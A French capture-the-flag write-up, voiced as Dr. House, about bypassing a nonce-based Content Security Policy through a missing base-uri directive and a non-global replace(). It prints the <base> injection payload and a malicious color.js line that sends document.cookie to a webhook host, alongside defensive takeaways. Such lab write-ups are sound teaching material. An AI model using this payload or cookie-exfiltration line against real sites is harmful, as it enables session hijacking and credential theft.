---
layout: default
---

# CSP Bypass : tout le monde ment, surtout les headers HTTP

**Dr. Gregory House, M.D.** -- ou comme certains m'appellent, "l'enfoiré qui avait raison". Je prends des Vicodin, je boite, et je casse des Content Security Policies. La seule différence avec mon boulot habituel, c'est que les patients ne meurent pas. Quoique, la carrière de certains développeurs devrait.

---

## Le patient du jour

On m'envoie un cas. Un site interne, **colorizer-corp.lab**, avec un input qui change les couleurs de la page. Le hash de l'URL est reflété dans le DOM. Il y a un bot admin qui visite les liens qu'on lui soumet. Et il a un cookie. Évidemment, on veut ce cookie.

Je jette un oeil à la CSP :

```
script-src 'nonce-DYNAMIC'; connect-src 'none'; img-src 'self';
frame-src 'none'; style-src 'self';
```

Nonces dynamiques sur les scripts. Pas de `unsafe-inline`, pas de `unsafe-eval`. Quelqu'un a fait ses devoirs. Enfin, c'est ce qu'on croit.

La page charge deux scripts dans cet ordre : `script.js` puis `color.js`, chacun avec un nonce frais. Et dans `script.js`, la sanitization du hash :

```javascript
res.innerHTML = decodeURI(hash).replace("<", "&lt;").replace(">", "&gt;");
```

Il y a aussi un `onhashchange` qui, lui, ne sanitize rien du tout. Intéressant. Tout le monde ment, mais parfois le code ment par omission.

---

## Le diagnostic différentiel

C'est là que mes idiots de subalternes commenceraient à balancer des hypothèses au hasard. Moi, je les élimine méthodiquement.

### Hypothèse 1 : injection `<script>` via innerHTML

Cameron proposerait ça. "On injecte une balise script !"

Non. Les scripts injectés via `innerHTML` ne s'exécutent jamais. C'est dans la spec HTML5, c'est connu depuis quinze ans. Suivant.

**C'est pas Lupus.**

### Hypothèse 2 : event handlers -- `<img onerror=...>`

Chase lèverait la main. "Un event handler bypasse innerHTML !"

Oui, `<img onerror>` s'exécute via innerHTML, bravo Chase, tu sais lire un blog de 2015. Sauf que la CSP exige un nonce. Pas de nonce, pas d'exécution. Le navigateur bloque. Refusé.

**C'est pas Lupus.**

### Hypothèse 3 : exploiter onhashchange

Foreman tenterait le coup. "Le handler `onhashchange` n'a aucune sanitization !"

Brillante observation, Einstein. Sauf qu'il faut du JavaScript pour changer le hash dynamiquement. Et pour exécuter du JavaScript, il faut... bypasser la CSP. On tourne en rond. C'est un bootstrap problem.

**C'est pas Lupus.**

### Hypothèse 4 : prédire le nonce

"Le nonce est peut-être faible ?" Non. C'est un hash MD5 aléatoire. Si tu arrives à prédire ça, postule à la NSA, pas ici.

**C'est pas Lupus.**

### Hypothèse 5 : `<meta http-equiv="refresh">`

On pourrait tenter une redirection via meta refresh injectée dans innerHTML. Ça ne marche pas non plus, les meta injectées dynamiquement sont ignorées par les navigateurs modernes.

**Toujours pas Lupus.**

### Le piège du `%27`

Petit détail vicieux. `decodeURI` ne décode PAS `%27` (single quote). C'est dans la spec : `decodeURI` ne décode que ce que `encodeURI` encode, et `encodeURI` n'encode pas les single quotes. Donc si on essaie de casser un attribut avec des single quotes encodées... rien ne se passe. Il faut utiliser `%22` (double quote). Tout le monde ment, y compris `decodeURI`.

---

## Le bon diagnostic

*Je fais tourner ma canne. Je fixe le tableau blanc. Et puis ça me frappe.*

La CSP n'a pas de directive `base-uri`.

La réalité est presque toujours fausse. Tout le monde regarde `script-src` comme un chien regarde le doigt qui pointe la lune. Mais la vraie faille est ce qui **n'est pas** dans la policy.

Sans `base-uri`, je peux injecter une balise `<base>`. Et `<base href>` change l'URL de base contre laquelle le navigateur résout les chemins relatifs et **les chemins absolus** type `/path/to/script.js`.

La sanitization ne remplace que le **premier** `<` et `>`. Pas de flag `/g` sur le `.replace()`. Alors je sacrifie une paire de chevrons, et la deuxième passe tranquillement :

```
#%3C%3E%3Cbase%20href=%22//evil.colorizer-corp.lab/%22%3E
```

Décodé, ça donne :

```html
<><base href="//evil.colorizer-corp.lab/">
```

Le premier `<>` se fait sanitizer en `&lt;&gt;`. Le `<base>` survit intact. Voici la séquence :

1. Le navigateur charge la page, commence à parser le HTML
2. `script.js` est rencontré avec son nonce -- le parser pause, l'exécute
3. `script.js` injecte le `<base>` dans le DOM via innerHTML
4. Le parser reprend et tombe sur la balise `<script nonce="..." src="/web-client/ch62/color.js">`
5. Il résout `/web-client/ch62/color.js` contre le **nouveau** base URL
6. Il charge `https://evil.colorizer-corp.lab/web-client/ch62/color.js` -- **mon** serveur
7. Le nonce est déjà dans le HTML statique -- le script est autorisé

Le nonce autorise un script quelle que soit son origine. Le nonce **est** l'autorisation. Tout le monde regarde d'où vient le script, mais la CSP ne regarde que le nonce. Tout le monde ment.

Sur mon serveur, je place un `color.js` malveillant :

```javascript
document.location = "https://webhook.colorizer-corp.lab/cb/12345678-abcd-ef01-2345-000000000000?c=" + document.cookie;
```

Le bot admin visite mon lien, charge mon script avec le bon nonce, et m'envoie son cookie comme un patient qui tousse dans la salle d'attente.

```
GET /cb/12345678-abcd-ef01-2345-000000000000?c=flag=CSP_BASE_URI_IS_NOT_LUPUS
```

Si personne ne te déteste, tu fais quelque chose de mal. Ce développeur me déteste probablement.

---

## Ce qu'on retient

| Symptôme | Diagnostic |
|---|---|
| CSP sans `base-uri` | `<base>` tag hijack les scripts chargés par chemin |
| `.replace()` sans `/g` | Seule la première occurrence est remplacée |
| Chemin absolu (`/path/file.js`) | Résolu contre `<base href>`, contrairement aux URLs complètes |
| Nonce sur un `<script src>` | Autorise l'exécution peu importe l'origine du fichier |
| `decodeURI` vs `decodeURIComponent` | `decodeURI` ignore `%27`, utiliser `%22` |
| Timing du parser HTML | Les scripts s'exécutent séquentiellement, le DOM est modifiable entre deux |

---

## Outils du diagnostic

- **Navigateur** : DevTools > Console + Network pour observer les chargements de scripts
- **Serveur HTTP** : `python3 -m http.server` pour servir le `color.js` piégé
- **Webhook** : n'importe quel service de callback pour capturer le cookie
- **CSP Evaluator** : [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) -- aurait immédiatement signalé l'absence de `base-uri`

---

*L'humanité est surestimée. Les Content Security Policies aussi.*
